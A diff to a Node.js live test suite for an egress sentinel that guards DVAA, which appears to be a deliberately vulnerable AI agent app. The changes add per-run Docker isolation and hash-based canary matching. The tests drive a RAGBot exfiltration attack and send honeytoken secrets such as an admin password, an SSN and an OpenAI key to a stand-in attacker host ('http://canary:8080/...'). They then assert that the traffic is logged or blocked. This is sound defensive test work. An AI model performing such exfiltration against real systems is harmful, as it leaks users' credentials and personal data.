@@ -6,16 +6,30 @@
 import { test, before, after } from 'node:test';
 import assert from 'node:assert/strict';
 import { execFileSync, spawnSync } from 'node:child_process';
+import { randomBytes } from 'node:crypto';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
+import { createHash } from 'node:crypto';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const COMPOSE = path.join(HERE, '..', 'compose.egress.yml');
-const PROJECT = process.env.EGRESS_TEST_PROJECT || 'sentinel-egress-t12test';
-const NET = process.env.EGRESS_TEST_NET || '10.231.13';
-const LOGDIR = fs.mkdtempSync(path.join(os.tmpdir(), 't12-live-'));
+// Isolation: concurrent runs (parallel `eval.sh gate`s, several agents) must never share a compose project
+// or a subnet. A shared project made one run's `up --force-recreate` / `down -v` destroy another run's
+// containers mid-test (main e0e5920 went red with 5-7 live failures). Each run therefore gets a unique
+// project (pid + random) and a /24 under 10.232.0.0/16 not used by any existing docker network; a subnet
+// clash with a run that started at the same moment is retried with a fresh subnet (bounded, then fail loud).
+const RUN_ID = `${process.pid}-${randomBytes(3).toString('hex')}`;
+const PROJECT = process.env.EGRESS_TEST_PROJECT || `sentinel-egress-t12test-${RUN_ID}`;
+const SUBNET_ATTEMPTS = 6;
+let NET = process.env.EGRESS_TEST_NET || null; // picked lazily (pickSubnet) unless pinned
+// Bind-mounted log dir lives under the repo's gitignored .eval/, NEVER under os.tmpdir(): Docker runtimes
+// that run the daemon in a VM (Colima, Lima, Rancher Desktop, remote daemons) share only $HOME-ish paths,
+// so a /var/folders/... or /tmp mount is silently empty inside the container (issue #60: 6/7 failed on Colima).
+const REPO = path.resolve(HERE, '..', '..', '..');
+const LOGDIR = path.join(REPO, '.eval', `egress-live-${RUN_ID}`);
+fs.mkdirSync(LOGDIR, { recursive: true });
 fs.chmodSync(LOGDIR, 0o777);
 const LOG = path.join(LOGDIR, 'egress.jsonl');
 const IMAGE = process.env.DVAA_IMAGE || 'dvaa-t1-dvaa';
@@ -29,11 +43,55 @@ const dc = (args, env = {}, input) => execFileSync('docker', ['compose', '-p', P
 });
 const records = () => (fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) : []);
 const canaryHits = () => dc(['logs', '--no-log-prefix', 'canary']).split('\n').filter((l) => l.includes('CANARY_HIT')).map((l) => JSON.parse(l));
+// Non-allowlisted hosts are logged as hash + length only (never by name): match the canary by its hash.
+const CANARY_SHA = createHash('sha256').update('canary').digest('hex').slice(0, 16);
+const isCanary = (x) => x.host === 'canary' || x.host_sha256 === CANARY_SHA;
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+/** /24 prefixes (e.g. "10.232.17") already used by any docker network on this host. */
+function usedPrefixes() {
+  const ids = spawnSync('docker', ['network', 'ls', '-q'], { encoding: 'utf8' }).stdout.split('\n').filter(Boolean);
+  if (!ids.length) return new Set();
+  const out = spawnSync('docker', ['network', 'inspect', '--format', '{{range .IPAM.Config}}{{.Subnet}} {{end}}', ...ids], { encoding: 'utf8' }).stdout;
+  return new Set(out.split(/\s+/).filter(Boolean).map((c) => c.split('/')[0].split('.').slice(0, 3).join('.')));
+}
+function pickSubnet() {
+  const used = usedPrefixes();
+  for (let i = 0; i < 64; i++) {
+    const p = `10.232.${1 + randomBytes(1)[0] % 254}`;
+    if (!used.has(p)) return p;
+  }
+  throw new Error('live egress tests: no free 10.232.x.0/24 subnet for an isolated compose project');
+}
+let torn = false;
+function teardown() {
+  if (torn) return; torn = true;
+  if (skip) { try { fs.rmSync(LOGDIR, { recursive: true, force: true }); } catch {} return; }
+  spawnSync('docker', ['compose', '-p', PROJECT, '-f', COMPOSE, 'down', '-v', '--remove-orphans'], {
+    env: { ...process.env, EGRESS_NET: NET ?? '10.232.0', EGRESS_LOG_DIR: LOGDIR, DVAA_IMAGE: IMAGE }, stdio: 'ignore', timeout: 60000,
+  });
+  try { fs.rmSync(LOGDIR, { recursive: true, force: true }); } catch {}
+}
+process.on('exit', teardown);
+for (const sig of ['SIGINT', 'SIGTERM']) process.on(sig, () => { teardown(); process.exit(130); });
 
 async function up(mode, allow) {
   fs.rmSync(LOG, { force: true });
-  dc(['up', '-d', '--force-recreate'], { EGRESS_MODE: mode, EGRESS_ALLOW: allow });
+  const pinned = Boolean(process.env.EGRESS_TEST_NET);
+  for (let attempt = 1; ; attempt++) {
+    if (!NET) NET = pickSubnet();
+    try {
+      dc(['up', '-d', '--force-recreate'], { EGRESS_MODE: mode, EGRESS_ALLOW: allow });
+      break;
+    } catch (e) {
+      const msg = `${e.stderr ?? ''}${e.message ?? ''}`;
+      const clash = /overlap|Pool overlaps|address already in use|already exists/i.test(msg);
+      try { dc(['down', '-v', '--remove-orphans']); } catch {}
+      if (clash && !pinned && attempt < SUBNET_ATTEMPTS) { NET = null; continue; }
+      throw new Error(`live egress tests: docker compose up FAILED (project=${PROJECT} subnet=${NET}.0/24 ` +
+        `attempt ${attempt}/${SUBNET_ATTEMPTS}${clash ? ', subnet/name clash with another run' : ''}):\n${msg.trim().slice(-2000)}`);
+    }
+  }
   for (let i = 0; i < 60; i++) {
     try { dc(['exec', '-T', 'dvaa', 'wget', '-qO-', 'http://127.0.0.1:7005/health']); return; } catch { await sleep(1000); }
   }
@@ -62,8 +120,17 @@ function sendFromDvaa(url, body) {
 }
 const hitsFor = (marker) => canaryHits().filter((h) => h.url.includes(marker));
 
+// Not skipped: runs on every machine, docker or not (issue #60 regression guard).
+test('isolation: bind-mounted log dir is under the repo .eval/, never under os.tmpdir(); project + subnet are per-run', () => {
+  const real = (p) => fs.realpathSync(p);
+  const tmp = real(os.tmpdir());
+  assert.ok(!real(LOGDIR).startsWith(tmp + path.sep), `log dir ${LOGDIR} must not be under os.tmpdir() (${tmp})`);
+  assert.ok(real(LOGDIR).startsWith(real(path.join(REPO, '.eval')) + path.sep), `log dir ${LOGDIR} must be under <repo>/.eval/`);
+  if (!process.env.EGRESS_TEST_PROJECT) assert.match(PROJECT, new RegExp(`-${process.pid}-[0-9a-f]{6}$`));
+});
+
 before(async () => { if (!skip) await up('observe', 'api.openai.com'); });
-after(() => { if (!skip) { try { dc(['down', '-v']); } catch {} } });
+after(() => teardown());
 
 test('observe: RAGBot 7005 exfil LANDS at the attacker server and is ALERTed (forward)', { skip }, async () => {
   const dvaa = attackRagbot('obs1');
@@ -71,7 +138,7 @@ test('observe: RAGBot 7005 exfil LANDS at the attacker server and is ALERTed (fo
   const hits = hitsFor('obs1');
   assert.equal(hits.length, 1, 'attacker received exactly one exfil request');
   assert.match(hits[0].url, /dvaa-admin-secret/);
-  const r = records().find((x) => x.host === 'canary');
+  const r = records().find(isCanary);
   assert.equal(r.action, 'forward');
   assert.ok(r.reasons.includes('destination_not_allowlisted') && r.reasons.includes('honeytoken_match'), `reasons=${r.reasons}`);
   assert.equal(r.alert.PatternDispositionDescription, 'Allowed');
@@ -94,7 +161,7 @@ test('block: RAGBot 7005 exfil is PREVENTED (attacker receives nothing) although
   assert.equal(hitsFor('blk1').length, 0, 'ground truth: nothing landed');
   assert.equal(dvaa.exfilExecuted, true, 'DVAA ground truth overstates success (scoring must use receipt)');
   assert.equal(dvaa.exfilResult?.statusCode, 403);
-  const r = records().find((x) => x.host === 'canary');
+  const r = records().find(isCanary);
   assert.equal(r.action, 'deny');
   assert.ok(r.reasons.includes('honeytoken_match'));
   assert.equal(r.alert.DetectName, 'HoneytokenExfiltrationAttempt');
@@ -152,7 +219,7 @@ test('block + canary allowlisted: only the honeytoken decides (12 KiB body, 300 
   assert.equal(sendFromDvaa(`http://canary:8080/pct?d=${enc}`), '403');
   await sleep(300);
   for (const m of ['tail8k', 'rows287', 'pct']) assert.equal(hitsFor(m).length, 0, `${m} must not land`);
-  const denies = records().filter((x) => x.action === 'deny' && x.host === 'canary');
+  const denies = records().filter((x) => x.action === 'deny' && isCanary(x));
   assert.deepEqual(denies.map((d) => d.canary_ids[0]), ['DVAA-ADMIN-PASSWORD', 'DVAA-SSN-JANE', 'DVAA-OPENAI-KEY']);
   // canary allowlisted: the honeytoken (not the destination) is what decided each deny
   assert.ok(denies.every((d) => d.reasons.includes('honeytoken_match') && !d.reasons.includes('destination_not_allowlisted')), JSON.stringify(denies.map((d) => d.reasons)));
